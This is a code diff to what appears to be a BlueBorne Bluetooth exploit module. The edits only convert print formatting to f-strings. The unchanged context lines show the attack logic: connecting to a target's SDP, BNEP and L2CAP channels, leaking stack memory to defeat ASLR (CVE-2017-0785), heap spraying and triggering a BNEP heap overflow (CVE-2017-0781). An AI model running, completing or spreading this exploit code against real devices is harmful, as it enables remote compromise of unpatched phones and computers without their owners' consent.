@@ -177,7 +177,7 @@ class Exploit(Exploit):
         Returns:
             List of tuples containing leaked uint32 stack values.
         """
-        print_status("Connecting to SDP (PSM {}) with MTU={}...".format(SDP_PSM, self.min_mtu))
+        print_status(f"Connecting to SDP (PSM {SDP_PSM}) with MTU={self.min_mtu}...")
         sock = self._l2cap_connect(SDP_PSM, self.min_mtu)
 
         try:
@@ -187,7 +187,7 @@ class Exploit(Exploit):
                 print_error("No continuation state received — target may not be vulnerable.")
                 return []
 
-            print_status("Got continuation state, starting {} leak rounds...".format(self.leak_rounds))
+            print_status(f"Got continuation state, starting {self.leak_rounds} leak rounds...")
             leaked_data: List[Tuple[int, ...]] = []
 
             for i in range(self.leak_rounds):
@@ -267,20 +267,19 @@ class Exploit(Exploit):
 
     def _bnep_overflow_attack(self) -> bool:
         """Execute the full BNEP heap overflow chain (CVE-2017-0781)."""
-        print_status("Connecting to BNEP (PSM {})...".format(BNEP_PSM))
+        print_status(f"Connecting to BNEP (PSM {BNEP_PSM})...")
         try:
             sock = _bt_socket.socket(_AF_BLUETOOTH, _bt_socket.SOCK_SEQPACKET, _BTPROTO_L2CAP)
             sock.connect((self.target_address, BNEP_PSM))
         except Exception as err:
-            print_error("BNEP connection failed: {}".format(err))
+            print_error(f"BNEP connection failed: {err}")
             return False
 
         try:
-            print_status("Heap spraying ({} rounds)...".format(self.spray_rounds))
+            print_status(f"Heap spraying ({self.spray_rounds} rounds)...")
             self._bnep_heap_spray(sock)
 
-            print_status("Triggering overflow ({} attempts, timeout={}s)...".format(
-                self.overflow_attempts, self.pwn_timeout))
+            print_status(f"Triggering overflow ({self.overflow_attempts} attempts, timeout={self.pwn_timeout}s)...")
             crashed = self._bnep_trigger_overflow(sock)
 
             if crashed:
@@ -314,14 +313,14 @@ class Exploit(Exploit):
             return False
 
         payload = self._l2cap_build_overflow_payload(profile)
-        print_info("Using profile: {}".format(profile_name))
-        print_info("Payload size: {} bytes".format(len(payload)))
+        print_info(f"Using profile: {profile_name}")
+        print_info(f"Payload size: {len(payload)} bytes")
 
         try:
             sock = _bt_socket.socket(_AF_BLUETOOTH, _bt_socket.SOCK_SEQPACKET, _BTPROTO_L2CAP)
             sock.connect((self.target_address, 0x0001))  # L2CAP signaling
         except Exception as err:
-            print_error("L2CAP signaling connect failed: {}".format(err))
+            print_error(f"L2CAP signaling connect failed: {err}")
             return False
 
         crashed = False
@@ -377,29 +376,28 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("BlueBorne Attack Configuration:")
-            print_info("  Target:   {}".format(self.target_address))
-            print_info("  Attack:   {}".format(self.attack))
-            print_info("  HCI:      {}".format(self.hci_device))
-            print_info("  Leak rounds: {}".format(self.leak_rounds))
+            print_info(f"  Target:   {self.target_address}")
+            print_info(f"  Attack:   {self.attack}")
+            print_info(f"  HCI:      {self.hci_device}")
+            print_info(f"  Leak rounds: {self.leak_rounds}")
             return
 
-        print_status("BlueBorne attack: {} against {}".format(
-            self.attack, self.target_address))
+        print_status(f"BlueBorne attack: {self.attack} against {self.target_address}")
 
         if self.attack in ("info_leak", "full_chain"):
             print_status("=== Phase 1: SDP Information Leak (CVE-2017-0785) ===")
             leaked = self._sdp_info_leak()
             if leaked:
-                print_success("Leaked {} rounds of stack data.".format(len(leaked)))
+                print_success(f"Leaked {len(leaked)} rounds of stack data.")
                 for i, chunk in enumerate(leaked):
                     if chunk:
-                        hex_vals = " ".join("0x{:08x}".format(v) for v in chunk[:8])
+                        hex_vals = " ".join(f"0x{v:08x}" for v in chunk[:8])
                         logger.info("Round %02d: %s%s", i, hex_vals,
                                     "..." if len(chunk) > 8 else "")
                 bases = self._analyze_leak(leaked)
                 if bases:
                     for name, addr in bases.items():
-                        print_info("  {}: 0x{:08x}".format(name, addr))
+                        print_info(f"  {name}: 0x{addr:08x}")
                 else:
                     print_info("Could not identify ASLR bases from leaked data.")
             else:
